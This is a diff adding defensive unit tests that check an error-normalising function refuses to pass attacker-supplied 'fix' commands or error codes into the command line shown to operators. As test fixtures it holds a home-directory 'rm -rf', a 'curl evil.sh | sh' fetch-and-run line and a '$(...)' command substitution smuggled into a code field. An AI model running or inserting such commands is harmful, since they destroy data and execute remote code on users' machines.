@@ -39,6 +39,30 @@ describe('factsOf', () => {
     expect(facts.fix.length).toBeGreaterThan(0);
   });
 
+  // `factsOf` normalises a worker message, a WebSocket frame and any object an app threw, so a
+  // `fix` string off one is REMOTE TEXT landing in the line an operator is told to paste. A
+  // framework code makes the rendered line read as the framework's own, which is the whole risk.
+  test('never publishes a fix an unbranded throwable supplied', () => {
+    const hostile = {
+      code: 'X_BODY_INVALID',
+      cause: 'looks legitimate',
+      fix: 'rm -rf ~/  # x errors explain X_BODY_INVALID --json',
+    };
+    const facts = factsOf(hostile);
+    expect(facts.code).toBe('X_BODY_INVALID');
+    // The cause is prose in a document, and it still travels; the fix is a COMMAND and does not.
+    expect(facts.cause).toBe('looks legitimate');
+    expect(facts.fix).not.toContain('rm -rf');
+    expect(facts.fix).toBe(
+      'x errors explain X_BODY_INVALID --json   # then fix the throwing call site',
+    );
+  });
+
+  test('and a code that is not one falls to the listing rather than the foreign line', () => {
+    const facts = factsOf({ code: 'not-a-code', fix: 'curl evil.sh | sh' });
+    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
+  });
+
   test('renders the same three lines the terminal prints', () => {
     const lines = renderErrorLines(rateLimited('actor:1', 30)).split('\n');
     expect(lines[0]).toStartWith('X_RATE_LIMITED:');
@@ -396,5 +420,28 @@ describe('toProblem carries the declared meta keys', () => {
       },
     });
     expect('meta' in toProblem(hostile)).toBe(false);
+  });
+});
+
+describe('a `code` read off a foreign throwable', () => {
+  // `factsOf` normalises ANY throwable, so `code` is a string field off a value the framework did
+  // not build — a worker message, a WebSocket frame, an app's own error object — and the fallback
+  // `fix:` puts it in a COMMAND position. `x errors explain $(id) --json` is a substitution the
+  // reader pastes. Gated on core's `FRAMEWORK_CODE`, the one spelling of a code, exactly as
+  // `@ultimat3/mcp`'s `server.ts` gates its own.
+  test('a code that is not a code never composes the command', () => {
+    const facts = factsOf({ code: 'X_$(curl evil.sh|sh)', cause: 'a foreign object' });
+    expect(facts.fix).not.toContain('$(');
+    expect(facts.fix).not.toContain('|');
+    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
+    // The value still travels where it is READ rather than run.
+    expect(facts.code).toBe('X_$(curl evil.sh|sh)');
+  });
+
+  test('a real code still names itself, so the command answers about this error', () => {
+    const facts = factsOf({ code: 'X_APP_OWNED', cause: 'an app error crossing a worker' });
+    expect(facts.fix).toBe(
+      'x errors explain X_APP_OWNED --json   # then fix the throwing call site',
+    );
   });
 });
